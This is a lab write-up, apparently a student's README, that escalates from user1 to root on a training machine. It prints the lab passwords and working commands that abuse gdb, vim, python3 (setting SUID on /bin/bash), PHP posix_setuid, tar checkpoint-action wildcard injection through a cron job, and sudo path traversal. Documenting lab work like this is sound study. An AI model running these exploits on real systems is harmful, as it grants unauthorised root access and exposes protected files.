# Privelege Escalation Laboratory 3
## This laboratory work is based on privelege escalation tecnhiques by exploiting different types of binaries.


### user1
**Pass:	WelcomeToCodwer**

We start with user1 and have to make our way up to user6 and then take root.

![image](https://github.com/cbr1N/codwer/assets/95069685/a102755e-85e4-4e1c-851e-43a40f126d39)

Here we should exploit the binary `/usr/bin/gdb` so that we can read the password for user2 from `/root/user2.txt`.
GTFOBins offers a file read exploit using `gdb`.

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
This requires that GDB is compiled with Python support.

```
gdb -nx -ex 'python print(open("/root/user2.txt").read())' -ex quit
```

This is the command we use to read the contents of `/root/user2.txt`.

![image](https://github.com/cbr1N/codwer/assets/95069685/1725015a-ec04-410d-b746-8e3da61081f7)


### user2
**Pass: WolfMountedFastnessNappy**

![image](https://github.com/cbr1N/codwer/assets/95069685/c44a3255-67df-4603-8f8b-771d72e225f8)

To get the password for user3 we hve to exploit the binary `vim.basic` that is stored in `/usr/bin`. 

The exploit is pretty simple and it also is on the GTFOBins website. Just search for `vim`.
Here we use the file read exploit. 

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
vim /root/user3.txt
```

![image](https://github.com/cbr1N/codwer/assets/95069685/086ec872-30e0-4433-ae28-4db021307435)


### user3
**Pass: PebblyClaritySuperiorMournful**

![image](https://github.com/cbr1N/codwer/assets/95069685/d21b3cc1-edbd-4514-a827-41370e9bfb39)

To get to the 4th user we have to exploit the `python3.11` binary so that we can gain read access to `/root/user4.txt`.

This one was a little tricky. I found the solution on juggernaut-sec. In this example we will set the SUID bit on a binary.

The easiest way to do this would be to assign the SUID bit to bash or any other shell binary; however, if we wanted to get creative, we could add the SUID bit to any binary found on GTFObins in the SUID section, and then just follow the steps to get root. After setting the SUID bit we use the `/bin/bash -p` command to drop in a root shell.
```
ls -l /bin/bash
python3 -c 'import os;os.chmod("/bin/bash", 0o4755)'
/bin/bash -p
cat /root/user4.txt
```

![image](https://github.com/cbr1N/codwer/assets/95069685/6fda0215-d35d-48d7-867a-010dbfa90350)


### user4
**Pass: JustifierDetachedCuppedEndurable**

![image](https://github.com/cbr1N/codwer/assets/95069685/d79eb96e-d6e5-47e7-a009-be79de42bb57)

Here the task is to exploit the `php8.2` binary. One common php exploit is to execute a command that we want as root with teh help of `posix_setuid(0)` 0 meaning the user id of root of course.

```
php -r "posix_setuid(0); system('cat /root/user5.txt');"
```

After setting our user id to 0 for executing this specific command, that being `cat /root/user5.txt` we easily get the password for user5.

![image](https://github.com/cbr1N/codwer/assets/95069685/286d13cb-4bea-4f03-a609-ad792301da2e)


### user5
**Pass: VentureRangedConveneVirus**

![image](https://github.com/cbr1N/codwer/assets/95069685/2dd05354-767c-48dc-8a26-96349dc0ceea)

To get past this task we have to exploit a cronjob. To be more exact we have to use command injection through a cron job. We also have the `pspy` script so that we can see the processes without root permissions.

![image](https://github.com/cbr1N/codwer/assets/95069685/cedbc69c-a995-4f00-975c-3680febd09f0)

Here are all the commands that are being executed every 50 seconds:

`/usr/bin/rm /home/user5/backup.tar.gz`  This command removes the file `backup.tar.gz` in the /home/user5 directory.

`/usr/sbin/CRON -f`  These are instances of the CRON daemon, which is responsible for executing scheduled tasks. The `-f` flag indicates running in the foreground.

`/bin/sh -c cd /home/user5 && /usr/bin/tar -czuf backup.tar.gz *`  This shell command changes the directory to `/home/user5` and creates a tarball named `backup.tar.gz` containing all files (`*`).

`/bin/sh -c cd / && run-parts --report /etc/cron.hourly`  This shell command changes the directory to the root directory (`/`) and runs all scripts in `/etc/cron.hourly`, reporting their execution.

`/bin/sh -c sleep 50 && /usr/bin/rm /home/user5/backup.tar.gz`  This command sleeps for 50 seconds and then removes the `backup.tar.gz` file from the `/home/user5` directory.

`/usr/bin/tar -czuf backup.tar.gz README.md pspy`  This tar command creates a compressed tarball named `backup.tar.gz` containing the files `README.md` and `pspy`.

`gzip`  This command is used to compress files using the gzip algorithm.

To exploit this cronjob we have to follow these exact steps:
```
echo "cp /bin/bash /tmp/myshell; chmod +s /tmp/myshell" > /home/user5/pwn.sh
chmod +x /home/user/pwn.sh
touch /home/user5/--checkpoint=1
touch /home/user5/--checkpoint-action=exec=sh\ pwn.sh
/tmp/myshell -p
cat /root/user6.txt
```

We created a script called `pwn.sh` in the `/home/user5` directory. This script is designed to copy the `/bin/bash` executable to `/tmp/myshell` and then change its permissions so that it can be run with elevated privileges.

We changed the permissions of the `pwn.sh` script to make it executable. This allows us to run the script later.

We created an empty file named `--checkpoint=1` in the `/home/user5` directory. This file is part of our strategy to exploit a specific parsing behavior in some programs.

We created another file named `--checkpoint-action=exec=sh pwn.sh` in the `/home/user5` directory. This file is intended to trigger the execution of our `pwn.sh` script when a checkpoint is reached by certain programs.

Finally, we executed the `/tmp/myshell` shell with the `-p` option. This preserves the effective user ID, allowing us to run the shell with root privileges. Since we had previously set the setuid bit on this shell, it runs with the permissions of the root user, effectively giving us a root shell.

![image](https://github.com/cbr1N/codwer/assets/95069685/3245d0c4-a95e-481e-adf2-e56901a75a30)


### user6
**Pass: RearViewUnscathedSantaRamble**

![image](https://github.com/cbr1N/codwer/assets/95069685/37e20fb3-d0fa-454e-9ae9-24fb9529fd15)

Here we have to use command injection exploiting the sudo rights given to user6.
As we can see user6 can run any Python 3 script located in the `/root/` directory as the root user without needing to provide a password. 

This exercise was a tricky one. We don't actually need command injection. What we really need to use is path traversal. But before that we should make some preparations.

Firstly we create a `.py` file. For example `lol.py`. We write a python sript that renames the file `password.txt` to `password.py` so that we will be able to open it using the `sudo python3` method.
But to actually run this script from our `/home/user6` path we can trick the system using the path traversal technique.

If the file path uses wildcards, we may execute arbitrary files.
In short, we can refer to files in different directories which the system owner unintended.

```
sudo -l
echo 'import os; os.rename("/root/password.txt", "/root/password.py")' > lol.py
sudo python3 /root/../../../home/user6/lol.py
sudo python3 /root/password.txt
```

![image](https://github.com/cbr1N/codwer/assets/95069685/3420331b-7898-4353-a8cb-b917fec8e7b4)


### root
**Pass: CapsAndMissesEverywhere**


## Lessons learned
I have learned a lot of things working on these tasks.

Understanding system components like `gdb`, `vim`, `python3`, `php8.2` and cron jobs. Knowing how these components operate and interact with the system is crucial for identifying potential avenues for exploitation.

Of course the most important part were the exploit techniques like file read exploits, setting SUID bits, command injection and path traversal.


## Useful links
- [https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/]

- [https://juggernaut-sec.com/capabilities/#Exploiting_Various_Capabilities]

- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities]

- [https://book.hacktricks.xyz/pentesting-web/command-injection]
